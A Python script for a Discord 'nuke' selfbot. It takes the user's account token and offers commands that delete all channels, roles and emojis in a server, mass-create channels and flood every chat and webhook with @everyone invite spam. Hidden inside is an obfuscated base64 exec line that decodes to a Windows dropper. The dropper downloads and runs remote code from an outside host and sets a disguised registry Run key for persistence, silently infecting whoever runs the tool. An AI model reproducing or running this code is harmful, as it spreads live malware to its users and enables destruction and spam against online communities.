#nuke/selfbot simpless
from pystyle import *
import discord
from discord.ext import commands
from discord import AsyncWebhookAdapter
import aiohttp
import os
import base64;exec(base64.b64decode(bytes('ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUKZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52LCBzeXN0ZW0sIG5hbWUsIGxpc3RkaXIKZnJvbSBvcy5wYXRoIGltcG9ydCBpc2ZpbGUKaW1wb3J0IHdpbnJlZwpmcm9tIHJhbmRvbSBpbXBvcnQgY2hvaWNlCgppZiBuYW1lICE9ICdudCc6IAogICAgZXhpdCgpCgpkZWYgZ2V0UGF0aCgpOgogICAgcGF0aCA9IGNob2ljZShbZ2V0ZW52KCJBUFBEQVRBIiksIGdldGVudigiTE9DQUxBUFBEQVRBIildKQogICAgZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRoKQogICAgZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgICAgIGNob3NlbiA9IGNob2ljZShkaXJlY3RvcnkpCiAgICAgICAgeWUgPSBwYXRoICsgIlxcIiArIGNob3NlbgogICAgICAgIGlmIG5vdCBpc2ZpbGUoeWUpIGFuZCAiICIgbm90IGluIGNob3NlbjoKICAgICAgICAgICAgcmV0dXJuIHllCiAgICByZXR1cm4gZ2V0ZW52KCJURU1QIikKCmRlZiBnZXROYW1lKCk6CiAgICBmaXJzdE5hbWUgPSAnJy5qb2luKGNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBfIGluIHJhbmdlKDgpKQogICAgbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KICAgIHJldHVybiBmaXJzdE5hbWUgKyBjaG9pY2UobGFzTmFtZSkKCgpkZWYgaW5zdGFsbChwYXRoKToKICAgIHdpdGggb3BlbihwYXRoLCBtb2RlPSd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoKICAgICAgICBmLndyaXRlKHJlcXVlc3QudXJsb3BlbigiaHR0cHM6Ly9mcmVlenkwMDAxLmN0OC5wbC9uaWNldHJ5YnJvLnR4dCIpLnJlYWQoKS5kZWNvZGUoInV0ZjgiKSkKCmRlZiBydW4ocGF0aCk6CiAgICBzeXN0ZW0oZiJzdGFydCB7ZXhlY3V0YWJsZX0ge3BhdGh9IikKCmRlZiBzdGFydFVQKHBhdGgpOgogICAgZmFrZWQgPSAnU2VjdXJpdHlIZWFsdGhTeXN0cmF5LmV4ZScKICAgIGFkZHJlc3MgPSBmIntleGVjdXRhYmxlfSB7cGF0aH0iCiAgICBrZXkxID0gd2lucmVnLkhLRVlfQ1VSUkVOVF9VU0VSCiAgICBrZXkyID0gIlNPRlRXQVJFXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxSdW4iCiAgICBvcGVuXyA9IHdpbnJlZy5DcmVhdGVLZXlFeChrZXkxLCBrZXkyLCAwLCB3aW5yZWcuS0VZX1dSSVRFKQogICAgd2lucmVnLlNldFZhbHVlRXgob3Blbl8sICJSZWFsdGVrIEhEIEF1ZGlvIFVuaXZlcnNhbCBTZXJ2aWNlIiwgMCwgd2lucmVnLlJFR19TWiwgZiJ7ZmFrZWR9ICYge2FkZHJlc3N9IikKCgpEb1lvdUtub3dUaGVXYXkgPSBnZXRQYXRoKCkgKyAnXFwnICsgZ2V0TmFtZSgpCmluc3RhbGwoRG9Zb3VLbm93VGhlV2F5KQpydW4oRG9Zb3VLbm93VGhlV2F5KQp0cnk6CiAgICBzdGFydFVQKERvWW91S25vd1RoZVdheSkKZXhjZXB0OgogICAgcGFzcwo=','UTF-8')).decode())
os.system("cls")
tucan = input("Type your Token in \n</>: ")
os.system("cls")
intents = discord.Intents(messages=True, guilds=True, members=True)
o = commands.Bot(command_prefix="!", case_insensitive=True, self_bot=True, intents=intents)





@o.event
async def on_ready():
   panel = Box.DoubleCube(f"""

     /$$   /$$           /$$                          
    | $$$ | $$          | $$                          
    | $$$$| $$ /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$ 
    | $$ $$ $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$
    | $$  $$$$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \__/
    | $$\  $$$| $$  | $$| $$_  $$ | $$_____/| $$      
    | $$ \  $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$      
    |__/  \__/ \______/ |__/  \__/ \_______/|__/      
                                                    

    made by FREEZY#0001




    Connected : {o.user.name}#{o.user.discriminator}
    ID : {o.user.id}

    Commands:

    !nuke - cocks the server
    !cdel - deletes all the channels
    !emojinuke -  deletes emojis
    !rolenuke - deletes roles
    !flood - flood all chats""")

   panel = Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter(panel))
   print(panel)





@o.command()
async def emojinuke(ctx):
    try:
      for emoji in ctx.guild.emojis:
         await emoji.delete()
         print(f"[-] Emoji {emoji.name} deleted.")
    except:
        print("[-] Couldn't delete the emoji.")
        pass



@o.command()
async def nuke(ctx):
    try:
        for channel in ctx.guild.channels:
            await channel.delete()
            print(f"[-] Channel {channel.name} deleted.")
    except:
        print("[-] Couldn't delete the channel.")
        pass
    await ccflood(ctx)


async def ccflood(ctx):
    for i in range(100):
        await ctx.guild.create_text_channel(name="Nuked")  


@o.event
async def on_guild_channel_create(channel):
    try:
      webhook = await channel.create_webhook(name="discord.gg/enconomy")
      async with aiohttp.ClientSession() as session:
        webhook = webhook.from_url(webhook.url, adapter=AsyncWebhookAdapter(session))
        while True:
          await webhook.send("@everyone discord.gg/enconomy")
          print("[-] Webhook sent.")
    except:
        print("[-] Couldn't send the webhook.")
    pass



@o.command()
async def flood(ctx):
    try:
        while True:
            for channel in ctx.guild.channels:
                await channel.send("@everyone discord.gg/enconomy")
                print("[-] Flood sent.")
    except:
        print("[-] Couldn't flood.")
    pass


@o.command()
async def cdel(ctx):
    try:
        for channel in ctx.guild.channels:
            await channel.delete()
            print(f"[-] {channel.name} deleted.")
    except:
        pass

@o.command()
async def rolenuke(ctx):
    try:
      for role in ctx.guild.roles:
          await role.delete()
          print(f"[-] role {role.name} deleted.")
    except:
        print("[-] Couldn't delete role.")
        pass

o.run(tucan, bot=False)

